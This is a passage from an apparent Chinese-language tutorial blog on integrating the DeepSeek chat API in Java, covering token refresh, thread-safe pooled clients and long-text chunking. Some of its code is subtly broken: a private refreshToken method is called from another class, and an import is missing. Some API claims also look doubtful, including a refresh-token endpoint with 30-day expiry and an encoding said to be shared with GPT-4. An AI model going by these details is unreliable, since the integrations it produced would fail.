                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
        ));

        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
        <span class="hljs-comment">// 鉴权失败直接抛异常，服务跟着崩</span>
        ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers), String.class);
        <span class="hljs-keyword">return</span> response.getBody();
    }
}
</code></pre>
<h3 data-id="heading-4">解决方案：实现 Token 自动刷新 + 异常兜底</h3>
<p>解决方案：实现 Token 自动刷新 + 异常兜底
核心思路：</p>
<ol>
<li>封装 Token 管理类，维护 Token 有效期，提前 1 天主动刷新；</li>
<li>增加鉴权异常捕获，触发被动刷新；</li>
<li>采用双重检查锁保证 Token 刷新的线程安全；</li>
<li>增加降级策略，Token 刷新失败时触发告警并返回兜底响应。</li>
</ol>
<h3 data-id="heading-5">完整正确代码</h3>
<p>读取配置的工具类</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.InputStream;
<span class="hljs-keyword">import</span> java.util.Properties;

<span class="hljs-comment">// 读取配置文件的工具</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PropertiesUtils</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> PropertiesUtils.class.getClassLoader().getResourceAsStream(<span class="hljs-string">"deepseek.properties"</span>)) {
            props.load(in);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"加载deepseek配置文件失败"</span>, e);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getProperty</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> props.getProperty(key);
        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"配置项["</span> + key + <span class="hljs-string">"]不存在"</span>);
        }
        <span class="hljs-keyword">return</span> value;
    }
}
</code></pre>
<p>然后是 Token 管理类和 API 调用客户端：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.http.*;
<span class="hljs-keyword">import</span> org.springframework.web.client.HttpClientErrorException;
<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;

<span class="hljs-comment">// Token 管理工具，自动刷新，线程安全</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekTokenManager</span> {
    <span class="hljs-comment">// 从配置文件读</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">REFRESH_TOKEN</span> <span class="hljs-operator">=</span> PropertiesUtils.getProperty(<span class="hljs-string">"deepseek.refresh.token"</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOKEN_REFRESH_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://api.deepseek.com/v1/auth/refresh"</span>;
    <span class="hljs-comment">// 30天有效期，提前1天刷新，单位都是毫秒</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">TOKEN_VALID_PERIOD</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">REFRESH_ADVANCE</span> <span class="hljs-operator">=</span> <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>;

    <span class="hljs-comment">// 当前能用的Token、过期时间、刷新用的锁</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> String currentToken;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> expireTime;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">refreshLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();

    <span class="hljs-comment">// 单例模式</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DeepSeekTokenManager</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepSeekTokenManager</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DeepSeekTokenManager <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;
    }

    <span class="hljs-comment">// 初始化的时候就加载第一个Token</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">DeepSeekTokenManager</span><span class="hljs-params">()</span> {
        refreshToken();
    }

    <span class="hljs-comment">// 拿能用的Token，自动判断要不要刷新</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getValidToken</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-comment">// 现在的时间加提前量，快到过期时间就刷新</span>
        <span class="hljs-keyword">if</span> (now + REFRESH_ADVANCE &gt;= expireTime) {
            refreshToken();
        }
        <span class="hljs-keyword">return</span> currentToken;
    }

    <span class="hljs-comment">// 刷新Token</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refreshToken</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (System.currentTimeMillis() + REFRESH_ADVANCE &lt; expireTime) {
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 加锁后再检查一遍，防止刚释放锁别人又进来了</span>
        refreshLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (System.currentTimeMillis() + REFRESH_ADVANCE &lt; expireTime) {
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// 拼刷新Token的请求</span>
            <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
            headers.setContentType(MediaType.APPLICATION_JSON);
            Map&lt;String, String&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            requestBody.put(<span class="hljs-string">"refresh_token"</span>, REFRESH_TOKEN);

            ResponseEntity&lt;Map&gt; response = restTemplate.postForEntity(
                    TOKEN_REFRESH_URL,
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers),
                    Map.class
            );

            <span class="hljs-keyword">if</span> (response.getStatusCode() == HttpStatus.OK) {
                Map&lt;String, Object&gt; resBody = response.getBody();
                <span class="hljs-built_in">this</span>.currentToken = (String) resBody.get(<span class="hljs-string">"access_token"</span>);
                <span class="hljs-built_in">this</span>.expireTime = System.currentTimeMillis() + TOKEN_VALID_PERIOD;
                System.out.println(<span class="hljs-string">"Token刷新成功，新的过期时间："</span> + expireTime);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Token刷新失败，响应码："</span> + response.getStatusCode());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.err.println(<span class="hljs-string">"Token刷新出问题了："</span> + e.getMessage());
            <span class="hljs-comment">// 临时延长10分钟，给运维留时间处理</span>
            <span class="hljs-built_in">this</span>.expireTime = System.currentTimeMillis() + <span class="hljs-number">10</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000L</span>;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Token刷新失败，已临时续命10分钟，赶紧查！"</span>, e);
        } <span class="hljs-keyword">finally</span> {
            refreshLock.unlock();
        }
    }
}

<span class="hljs-comment">// DeepSeek API 调用客户端（集成Token管理）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekApiClient</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">API_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://api.deepseek.com/v1/chat/completions"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DeepSeekTokenManager</span> <span class="hljs-variable">tokenManager</span> <span class="hljs-operator">=</span> DeepSeekTokenManager.getInstance();

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callDeepSeek</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 获取有效Token</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> tokenManager.getValidToken();
        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
        headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + token);
        headers.setContentType(MediaType.APPLICATION_JSON);

        <span class="hljs-comment">// 构建请求体</span>
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
        ));
        requestBody.put(<span class="hljs-string">"timeout"</span>, <span class="hljs-number">30000</span>); <span class="hljs-comment">// 30秒超时</span>

        HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);

        <span class="hljs-keyword">try</span> {
            ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, request, String.class);
            <span class="hljs-keyword">return</span> response.getBody();
        } <span class="hljs-keyword">catch</span> (HttpClientErrorException.Unauthorized e) {
            System.err.println(<span class="hljs-string">"鉴权失败，强制刷新Token重试："</span> + e.getMessage());
            tokenManager.refreshToken();
            <span class="hljs-comment">// 重试请求</span>
            headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + tokenManager.getValidToken());
            HttpEntity&lt;Map&lt;String, Object&gt;&gt; retryReq = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);
            <span class="hljs-keyword">return</span> restTemplate.postForEntity(API_URL, retryReq, String.class).getBody();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.err.println(<span class="hljs-string">"API调用出错："</span> + e.getMessage());
            <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"choices\":[{\"message\":{\"content\":\"稍等一下，请求有点问题~\"}}]}"</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-6">关键优化点说明</h3>
<ol>
<li><strong>配置化</strong>：用 properties 文件存 Token，改的时候不用动代码；</li>
<li><strong>主动+被动刷新</strong>：提前1天主动刷，漏了还有401被动刷，基本不会过期；</li>
<li><strong>线程安全</strong>：双重检查锁 + 可重入锁，多线程的时候只会有一个去刷新；</li>
<li><strong>降级兜底</strong>：刷新失败临时续命10分钟，API调用错了返回友好提示，服务不会直接崩。</li>
</ol>
<h2 data-id="heading-7">二、坑 2：并发调用线程不安全，数据错乱/连接泄漏</h2>
<h3 data-id="heading-8">问题本质</h3>
<p>好多人写代码的时候，RestTemplate 不配置连接池，还把 HttpHeaders 这种东西做成全局共享的。多线程一并发就出问题：</p>
<ul>
<li>多线程并发调用时，请求头/请求体数据错乱；</li>
<li>RestTemplate 未配置连接池，高并发下出现连接泄漏、端口耗尽；</li>
<li>未做线程池隔离，API 调用超时导致线程池阻塞，影响其他业务。</li>
</ul>
<h3 data-id="heading-9">典型错误代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例：共享非线程安全对象，无连接池，无线程池隔离</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeDeepSeekClient</span> {
    <span class="hljs-comment">// 错误：RestTemplate未配置连接池，高并发下连接泄漏</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
    <span class="hljs-comment">// 错误：共享HttpHeaders，多线程下数据错乱</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">sharedHeaders</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();

    <span class="hljs-keyword">static</span> {
        sharedHeaders.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer sk-xxxxxxxx"</span>);
        sharedHeaders.setContentType(MediaType.APPLICATION_JSON);
    }

    <span class="hljs-comment">// 错误：无线程池，直接同步调用，超时阻塞主线程</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">concurrentCall</span><span class="hljs-params">(String prompt)</span> {
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">// HashMap也不是线程安全的</span>
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
        ));

        <span class="hljs-comment">// 多线程下sharedHeaders可能被篡改</span>
        HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, sharedHeaders);
        <span class="hljs-comment">// 无超时配置，调用超时阻塞线程</span>
        ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, request, String.class);
        <span class="hljs-keyword">return</span> response.getBody();
    }
}
</code></pre>
<h3 data-id="heading-10">解决方案：线程池隔离 + 连接池配置 + 线程安全封装</h3>
<p>核心思路：</p>
<p>配置 RestTemplate 连接池，限制最大连接数、超时时间，避免连接泄漏；</p>
<ol>
<li>使用线程池隔离 DeepSeek API 调用，避免影响核心业务；</li>
<li>每个请求独立创建 HttpHeaders、HashMap，避免多线程共享；</li>
<li>增加请求超时、线程池拒绝策略，保证服务稳定性。</li>
</ol>
<h3 data-id="heading-11">完整正确代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.apache.http.client.config.RequestConfig;
<span class="hljs-keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;
<span class="hljs-keyword">import</span> org.apache.http.impl.client.HttpClientBuilder;
<span class="hljs-keyword">import</span> org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
<span class="hljs-keyword">import</span> org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
<span class="hljs-keyword">import</span> org.springframework.web.client.RestTemplate;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.*;

<span class="hljs-comment">// 线程安全的DeepSeek API客户端（含连接池、线程池配置）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadSafeDeepSeekClient</span> {
    <span class="hljs-comment">// 带连接池的RestTemplate</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> RestTemplate restTemplate;
    <span class="hljs-comment">//  配置线程池：隔离DeepSeek API调用，避免影响核心业务</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ExecutorService deepSeekExecutor;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// 1. 先配HTTP连接池，控制最大连接数</span>
        <span class="hljs-type">PoolingHttpClientConnectionManager</span> <span class="hljs-variable">connManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolingHttpClientConnectionManager</span>();
        connManager.setMaxTotal(<span class="hljs-number">100</span>); <span class="hljs-comment">// 总共最多100个连接</span>
        connManager.setDefaultMaxPerRoute(<span class="hljs-number">50</span>); <span class="hljs-comment">// 同一个地址最多50个连接</span>

        <span class="hljs-comment">// 超时配置，别卡太久</span>
        <span class="hljs-type">RequestConfig</span> <span class="hljs-variable">requestConfig</span> <span class="hljs-operator">=</span> RequestConfig.custom()
                .setConnectTimeout(<span class="hljs-number">5000</span>) <span class="hljs-comment">// 连服务器5秒超时</span>
                .setConnectionRequestTimeout(<span class="hljs-number">3000</span>) <span class="hljs-comment">// 从连接池拿连接3秒超时</span>
                .setSocketTimeout(<span class="hljs-number">30000</span>) <span class="hljs-comment">// 读数据30秒超时</span>
                .build();

        <span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClientBuilder.create()
                .setConnectionManager(connManager)
                .setDefaultRequestConfig(requestConfig)
                .build();

        <span class="hljs-comment">// 把连接池配置给RestTemplate</span>
        <span class="hljs-type">HttpComponentsClientHttpRequestFactory</span> <span class="hljs-variable">requestFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpComponentsClientHttpRequestFactory</span>(httpClient);
        restTemplate = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>(requestFactory);

        <span class="hljs-comment">// 2. 再配个专用线程池</span>
        deepSeekExecutor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
                <span class="hljs-number">10</span>, <span class="hljs-comment">// 平时保持10个活线程</span>
                <span class="hljs-number">50</span>, <span class="hljs-comment">// 最多扩到50个线程</span>
                <span class="hljs-number">60L</span>, TimeUnit.SECONDS, <span class="hljs-comment">// 空闲线程60秒没人用就关掉</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>), <span class="hljs-comment">// 任务排队最多1000个</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadFactory</span>() {
                    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
                    <span class="hljs-meta">@Override</span>
                    <span class="hljs-keyword">public</span> Thread <span class="hljs-title function_">newThread</span><span class="hljs-params">(Runnable r)</span> {
                        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);
                        thread.setName(<span class="hljs-string">"deepseek-api-thread-"</span> + count++);
                        thread.setDaemon(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 守护线程，程序关的时候不用等它</span>
                        <span class="hljs-keyword">return</span> thread;
                    }
                },
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy() <span class="hljs-comment">// 任务满了就让调用者自己执行，别丢任务</span>
        );
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">DeepSeekTokenManager</span> <span class="hljs-variable">tokenManager</span> <span class="hljs-operator">=</span> DeepSeekTokenManager.getInstance();

    <span class="hljs-comment">// 异步调用DeepSeek API（线程安全）</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">asyncCall</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 把任务丢到专用线程池里</span>
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 关键：每个请求自己建请求头，别共享</span>
            <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
            headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + tokenManager.getValidToken());
            headers.setContentType(MediaType.APPLICATION_JSON);

            <span class="hljs-comment">// 关键：每个请求独立创建请求体，避免HashMap线程不安全问题</span>
            Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
            requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                    Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)
            ));
            requestBody.put(<span class="hljs-string">"temperature"</span>, <span class="hljs-number">0.7</span>); <span class="hljs-comment">// 随机性调中等</span>
            requestBody.put(<span class="hljs-string">"max_tokens"</span>, <span class="hljs-number">2000</span>); <span class="hljs-comment">// 最多返回2000个Token</span>

            HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);

            <span class="hljs-keyword">try</span> {
                ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(API_URL, request, String.class);
                <span class="hljs-keyword">return</span> response.getBody();
            } <span class="hljs-keyword">catch</span> (Exception e) {
                System.err.println(<span class="hljs-string">"线程"</span> + Thread.currentThread().getName() + <span class="hljs-string">"调用出错："</span> + e.getMessage());
                <span class="hljs-keyword">return</span> <span class="hljs-string">"{\"choices\":[{\"message\":{\"content\":\"请求失败，稍后再试~\"}}]}"</span>;
            }
        }, deepSeekExecutor);
    }

    <span class="hljs-comment">// 关闭线程池（应用关闭时调用）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdownExecutor</span><span class="hljs-params">()</span> {
        deepSeekExecutor.shutdown();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 等10秒，还没关完就强制关</span>
            <span class="hljs-keyword">if</span> (!deepSeekExecutor.awaitTermination(<span class="hljs-number">10</span>, TimeUnit.SECONDS)) {
                deepSeekExecutor.shutdownNow();
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            deepSeekExecutor.shutdownNow();
        }
    }
}
</code></pre>
<h3 data-id="heading-12">关键优化点说明</h3>
<ol>
<li><strong>连接池限流</strong>：控制最大连接数，高并发的时候不会把服务器端口占满；</li>
<li><strong>线程池隔离</strong>：API调用出问题不会影响核心业务，拒绝策略选“调用者执行”，避免任务丢失；</li>
<li><strong>每个请求独立</strong>：请求头和请求体都自己建，彻底解决多线程数据乱的问题；</li>
<li><strong>异步提升效率</strong>：用CompletableFuture异步调用，主线程不用等，服务吞吐量直接上来。</li>
</ol>
<h2 data-id="heading-13">三、坑 3：超长文本未分块，触发 API 长度限制</h2>
<h3 data-id="heading-14">问题本质</h3>
<p>DeepSeek 的模型都有 Token 限制，比如 deepseek-chat 单轮最多大概 8192 个 Token。好多人不管文本多长都直接传，要么返回 400 说“超出长度”，要么自己瞎截断把关键信息切没了，模型回复得乱七八糟。更坑的是，有人按字数算长度，不知道中文和英文占的 Token 不一样，切完还是超。</p>
<h3 data-id="heading-15">典型错误代码</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误示例：直接传入超长文本，无分块、无Token计算</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongTextErrorClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callLongText</span><span class="hljs-params">(String longContent)</span> {
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, <span class="hljs-string">"deepseek-chat"</span>);
        <span class="hljs-comment">// 直接把超长文本丢进去，不管长度</span>
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(
                Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, longContent)
        ));

        <span class="hljs-type">HttpHeaders</span> <span class="hljs-variable">headers</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHeaders</span>();
        headers.set(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"Bearer "</span> + DeepSeekTokenManager.getInstance().getValidToken());
        HttpEntity&lt;Map&lt;String, Object&gt;&gt; request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpEntity</span>&lt;&gt;(requestBody, headers);
        <span class="hljs-type">RestTemplate</span> <span class="hljs-variable">restTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RestTemplate</span>();
        <span class="hljs-keyword">return</span> restTemplate.postForEntity(API_URL, request, String.class).getBody();
    }
}
</code></pre>
<h3 data-id="heading-16">解决方案：Token 计算 + 智能分块 + 结果拼接</h3>
<p>核心思路：</p>
<ol>
<li>实现 Token 计数器，准确计算文本对应的 Token 数（适配 DeepSeek 的 Token 编码规则）；</li>
<li>按模型最大 Token 限制，对超长文本进行智能分块（保留语义完整性，避免截断句子）；</li>
<li>分块调用 API 后，拼接所有分块的回复结果；</li>
<li>多轮对话场景下，优先截断历史对话，保留最新上下文。</li>
</ol>
<h3 data-id="heading-17">完整正确代码</h3>
<p>先加依赖（Maven），这个工具能精准算 Token：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.knuddels<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jtokkit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>然后是长文本处理工具：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.knuddels.jtokkit.Encodings;
<span class="hljs-keyword">import</span> com.knuddels.jtokkit.api.Encoding;
<span class="hljs-keyword">import</span> com.knuddels.jtokkit.api.EncodingRegistry;
<span class="hljs-keyword">import</span> com.knuddels.jtokkit.api.ModelType;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.concurrent.CompletableFuture;
<span class="hljs-keyword">import</span> java.util.stream.Collectors;

<span class="hljs-comment">// 长文本处理工具，算Token、分块、拼结果一条龙</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LongTextProcessor</span> {
    <span class="hljs-comment">// 初始化Token计算器，DeepSeek用的编码和GPT-4一样</span>
